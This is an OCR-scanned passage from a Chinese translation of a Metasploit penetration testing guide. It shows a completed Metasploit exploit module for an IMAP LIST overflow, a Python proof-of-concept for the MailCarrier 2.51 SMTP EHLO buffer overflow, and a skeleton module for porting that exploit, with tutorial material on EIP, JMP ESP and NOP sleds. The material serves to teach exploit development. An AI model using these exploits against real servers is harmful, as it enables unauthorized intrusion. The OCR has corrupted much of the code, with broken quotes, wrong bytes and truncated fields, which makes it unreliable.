Metasploit渗透测试指南
我们将确定其他还顽固残留的坏字符作为一个作业留给读者。一种尽管烦琐但非常优秀的
消除所有坏字符的方法请参考http://en.wikibooks.org/wiki/Metasploit/WritingWindows
Exploit#Dealing_with_badchars。
现在我们完成的渗透代码，包括我们前面加入的所有代码片段，如下所示：
require 'msf/core'
class Metasploit3 MSF_LICENSE,
'Version'
=>'$Revision: 1 $',
'References'
=>
'BID'，‘28260′],
'CVE'，
‘2008-1498′］,
'URL'，‘
'http://www.exploit-db.com/exploits/5259'],
'Privileged'
=>false,
'Defaultoptions′ =>
{
EXITFUNC'=>'thread'，
'Payload'
=>
'Space'
=>10351,
‘DisableNops' => true,
'BadChars'
=>"\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b
'Platform
=>'win',
'Targets'
=>
1,
'DisclosureDate′=>‘March 13 2008',
'DefaultTarget'
=>0))
end
212
---
## Page 240
第14章创建你自己的渗透攻击模块
defexploit
connected = connect_login
lead = "\x9o" * (10351 - payload.encoded.length)
near="\xe9\xdd\xd7\xff\xff"
nseh ="\xeb\xf9\x90\x90"
evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
print_status("Sending payload")
sploit =‘o002 LIST （)"/′+ evil +‘""PWNED"’+"\r\n"
sock.put(sploit)
handler
disconnect
end
end
14.6小结
尽管在这章我们并没有发现一些新的漏洞，但是我们覆盖了从编写和运行一个Fuzz探测器
到编写一个可用的渗透攻击模块的完整过程。我们在本章编写的这个渗透攻击模块是比较复杂
和不寻常的，因此提供了一个很好的案例，让我们能够超越所掌握的基础知识，思考如何探索
创新的想法来获取代码执行机会。
深入掌握和了解Metasploit最好的方法是阅读Metasploit的源代码和其他的渗透攻击模块源
码，这样我们才能够更好地理解Metasploit框架中到底埋藏了哪些宝藏。本章介绍技术可以为
你提供开始控掘漏洞和开发Metasploit渗透攻击模块所必须掌握的基础工具与方法。
在第15章中，我们将基于本章所学到的知识，开始进入如何将现有的渗透代码移植入
Metasploit框架的实践中，我们将向你演示如何通过重写代码与动态调试，把公开可获取到的一
些渗透代码转换为可用的Metasploit渗透攻击模块。
213
---
## Page 241
PDG
---
## Page 242
第
将渗透代码移植到Metasploit框架
只是回报安全社区和Metasploit框架。并非所有的渗透代码都是基于Metasploit框架的，很多是
以Perl、Python、C/C++语言所编写的。
当你想将渗透代码移植到Metasploit框架中时，你需要将现有独立的渗透代码，如Python或
Perl的一些脚本，转换为能够在Metasploit 中使用的渗透攻击模块。当然，在你将一个渗透代码
集成入Metasploit框架之后，你就可以利用Metasploit框架的丰富而又强大的各种工具来处理例
行的任务，因此你可以集中关注于特定渗透攻击所独特的问题上。另外，尽管独立的渗透代码通
常只能使用特定的攻击载荷，以及只能针对特定的操作系统版本，一旦移植到了Metasploit框架
中，攻击载荷就可以动态产生，而你的渗透代码就可以在更多的场景中进行使用了。
本章将带你一起来经历将两个独立渗透代码移植到Metasploit框架中的流程，如果你拥有
对这些基本概念的了解，并且能够花费一些实践尝试的时间，相信在本章的学习结束之后，你
就有能力开始将已有的渗透代码移植进Metasploit框架了。
---
## Page 243
Metasploit渗透测试指南
15.1汇编语言基础
如果想要从本章取得更多的收获，你需要对汇编语言有个基础的了解。我们在本章中将使
用大量底层汇编语言指令和命令，让我们来看看那些最普遍使用的基础概念和指令。
15.1.1EIP和ESP寄存器
寄存器是CPU中用来存储信息、执行计算，以及放置应用程序在运行时所需数值的场所。
两个最为重要的寄存器是EIP（ExtendedInstructionPointer）扩展指令指针寄存器和ESP
（Extended StackPointer）扩展栈指针寄存器。
EIP寄存器中的值告诉应用程序完成当前指令执行之后下一条指令的位置。在本章中，我
们将需要覆盖EIP返回地址，并将其指向我们的邪恶shellcode。在我们的缓冲区溢出攻击中，
ESP寄存器所指向的地方，往往是我们期望将正常应用程序数据改写为我们的恶意指令，从而
导致崩溃的位置。ESP寄存器通常要被改写为放置我们邪恶shellcode的内存地址。
15.1.2JMP指令集
JMP指令集是用来跳转到ESP内存地址的一类指令。在在本章将要探索的一些缓冲区溢出
案例中，我们会使用JMPESP指令来告诉计算机去已经包含有我们shellcode的ESP内存地址
去执行指令。
15.1.3空指令和空指令滑行区
一个空指令是无任何操作动作的指令。在很多时候当你触发一次溢出时，你并不能精确地
不要做任何事情”。空指令以十六进制形式描述就是一个x90。
空指令滑行区就是由一组连续的空指令组成，为我们的shellcode来创建“安全着陆区”的
指令区间。当我们在溢出时触发了JMPESP指令，我们将跳转到一堆空指令中，并顺序地跳过
这些空指令直至到达shellcode。
15.2移植一个缓冲区溢出攻击代码
我们的第一个案例是一个典型的远程缓冲区溢出攻击代码，只需要一个jumpESP指令就可
以完成到shellcode的跳转。这个渗透代码的名称是“MailCarrier2.51SMTPEHLO/HELO缓冲
区溢出攻击”，使用MailCarrier2.51SMTP命令触发缓冲区溢出。
提示：你可以在http://www.exploit-db.com/exploits/598/上找到这个渗透代码和存在漏洞的
应用软件。
216
---
## Page 244
第15章将渗透代码移植到Metasploit框架
但这是--个相当老的渗透代码，原先只是为Windows2000系统而开发的。当你现在运行这
段代码时，基本上无法如你所愿地正常工作。在Metasploit框架中已经有一个渗透攻击模块实
现了这个漏洞利用，同时也进行了一些优化。在花一点时间调查下变化的缓冲区长度之后，你
可以发现这个渗透攻击模块为shellcode提供了1000字节的可用空间，而缓冲区长度需要调整4
个字节。（如果需要了解如何完成的更多信息，请阅读在http://www.exploit-db.com/download
pdf/13535/链接上的“渗透代码编写教程第一部分：堆栈溢出”。?以下是这个渗透利用的概念
验证性代码，其中我们已经移除了shellcode，并将jump跳转指令地址替换为了AAAA字符串。
（所谓概念验证性代码PoC，是为包含基本必要的代码可以来验证漏洞利用过程，但没有包含实
际的攻击载荷，并通常需要较多修改才能够真正用于攻击的渗透代码。）
#!/usr/bin/python
#MailCarrier 2.51 SMTP EHLO/HELOBuffer Overflow
#
#Advanced，secureandeasytouse MailServer.
#
#230ct2004-muts
#
import struct
import socket
print"\nMailCarrier 2.51 SMTP EHLO/HELO Buffer Overflow"
print "\nFound & coded by muts [at] whitehat.co.il"
print "\nfor Educational Purposes Only!\n"
S=Socket.socket(socket.AF_INET，Socket.SOCK_STREAM)
buffer="\x41"*5093
buffer += "\42" * 4
buffer += "\x9o" * 32
buffer += "\xcc" * 1000
try:
print "\nSending evilbuffer..."
s.connect(('192.168.1.155',25))
s.send('EHLO'+buffer+‘\r\n')
data=s.recv(1024)
s.close()
print "\nDone!"
except:
print"Could notconnect toSMTP!"
你一定已经想到了，将这么一段独立的渗透代码移植到Metasploit中最简单和快速的办法
就是从框架中一个已有的类似模块进行修改。我们接下来就这么做。
①译者注：堆栈溢出的中文译稿请参考看雪论坛：http://bbs.pediy.com/showthread.php?p=713035#post713035）。
217
---
## Page 245
Metasploit渗透测试指南
15.2.1
裁剪一个已有的渗透攻击代码
作为我们移植MailCarrier渗透代码的第一步，先对一个已有的Metasploit渗透攻击模块进
行裁剪，并生成出一个渗透攻击模块骨架文件，如下所示：
require'msf/core
class Metasploit3'TABS MailCarrier v2.51 SMTP EHLO Overflow'，
'Description′=> %q{
This module exploits the MailCarrier v2.51 suite SMTP service.
'Author'
>
'Your Name' ],
'Arch'
=>[ ARCH_X86 ］,
'License'
=> MSF_LICENSE,
'Version'
=>'$Revision:7724 $'，
'References'
=>
'CVE'，‘
‘2004-1638′］,
'OSVDB'，
'11174′],
'BID'，
‘11535′]，
'URL'，‘http://www.exploit-db.com/exploits/598′],
'privileged'
=>true,
'Defaultoptions'
=>
{
'EXITFUNC'
=>'thread',
}
'Payload'
=
f
=>300，
BadChars
=>"\x00\x0a\x0d\x3a"
'StackAdjustment'
=>-3500,
'Platform'
“[,uTM,]
['WindowsXPSP2-EN'，{'Ret'=>Oxdeadbeef}]
'DefaultTarget'
((o<=
register_options(
③Opt::RPORT(25),
Opt::LHOST(),#Required for stack offset
218
---
## Page 246
第15章将渗透代码移植到Metasploit框架
],self.class)
end
def exploit
connect
①sock.put(sploit+"\r\n")
handler
disconnect
end
end
因为这个渗透攻击不需要认证过程，所以我们仅仅需要包含Msf:：Exploit:Remote:：Tcp这一
个mixin，我们已经在之前的章节中讨论了mixin，你应该还有印象mixin可以允许你使用一些
内建的协议，比如Remote:Tcp?，来进行基本的远程TCP通信。
在前面所列出的源码中，目标系统上返回地址目前还是一个未经确定的替代值
Oxdeadbeef，默认的TCP段设置为25③。在连接到目标系统上之后，Metasploit将通过sock.put
方法+发送邪恶的攻击数据，从而为我们完成渗透入侵。
15.2.2构造渗透攻击过程
接下来让我们看一下如何构造初始的渗透攻击过程，我们首先需要按照SMTP协议要求向
服务发出一个问候，其中包含一个长字符串，然后是一个我们将控制EIP的占位地址，接着是
一段空指令滑行区，最后是用来加载 Shellcode的内存区。下面就是这段代码的实现：